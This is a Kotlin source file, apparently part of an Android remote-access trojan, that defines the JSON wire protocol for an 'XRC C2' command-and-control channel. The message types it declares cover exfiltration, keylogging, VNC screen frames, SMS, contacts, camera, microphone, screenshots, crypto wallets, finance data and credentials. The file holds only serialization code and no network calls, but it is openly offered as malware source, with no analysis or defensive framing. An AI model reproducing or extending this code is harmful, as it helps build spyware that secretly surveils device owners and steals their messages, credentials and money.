// ============================================================
// FILE: android/app/src/main/java/com/xrc/comms/Protocol.kt
// ============================================================
package com.xrc.comms

import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json

/**
 * Wire protocol for XRC C2 communication.
 *
 * Message envelope format:
 * {
 *   "type": "heartbeat" | "cmd" | "cmd_result" | "exfil" | "register" | "vnc_frame" | "keylog" | ...
 *   "id": "unique-message-id",
 *   "device_id": "device-identifier",
 *   "ts": 1234567890,
 *   "payload": { ... }
 * }
 */
object Protocol {
    val json = Json {
        ignoreUnknownKeys = true
        encodeDefaults = true
        prettyPrint = false
        isLenient = true
    }

    // Message types
    const val TYPE_HEARTBEAT = "heartbeat"
    const val TYPE_REGISTER = "register"
    const val TYPE_CMD = "cmd"
    const val TYPE_CMD_RESULT = "cmd_result"
    const val TYPE_CMD_ACK = "cmd_ack"
    const val TYPE_EXFIL = "exfil"
    const val TYPE_VNC_FRAME = "vnc_frame"
    const val TYPE_KEYLOG = "keylog"
    const val TYPE_NOTIFICATION = "notification"
    const val TYPE_LOCATION = "location"
    const val TYPE_SMS = "sms"
    const val TYPE_CONTACTS = "contacts"
    const val TYPE_CAMERA = "camera"
    const val TYPE_MICROPHONE = "mic"
    const val TYPE_SCREENSHOT = "screenshot"
    const val TYPE_FILE = "file"
    const val TYPE_WALLET = "wallet"
    const val TYPE_FINANCE = "finance"
    const val TYPE_CREDENTIAL = "credential"
    const val TYPE_ACCOUNT = "account"
    const val TYPE_LOG = "log"
    const val TYPE_ERROR = "error"
}

@Serializable
data class Message(
    val type: String,
    val id: String = "",
    val device_id: String = "",
    val ts: Long = System.currentTimeMillis(),
    val payload: String = "{}"
)

@Serializable
data class CommandMessage(
    val id: String,
    val action: String,
    val payload: String = "{}",
    val priority: String = "normal"
)

/**
 * Serialize a message to JSON.
 */
fun Message.serialize(): String {
    return Protocol.json.encodeToString(this)
}

/**
 * Deserialize a JSON string to Message.
 */
fun Message.deserialize(jsonStr: String): Message? {
    return try {
        Protocol.json.decodeFromString<Message>(jsonStr)
    } catch (e: Exception) {
        null
    }
}
